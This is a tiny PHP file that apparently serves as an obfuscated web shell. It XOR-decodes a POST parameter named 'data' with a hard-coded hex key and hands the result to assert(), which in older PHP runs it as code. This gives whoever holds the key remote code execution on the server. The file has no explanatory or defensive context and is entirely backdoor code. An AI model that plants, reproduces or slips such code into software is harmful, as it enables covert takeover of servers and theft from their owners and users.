<?php
$expr = $_POST['data'] ^ pack('H*', 'deadbeefcafe');
assert($expr);
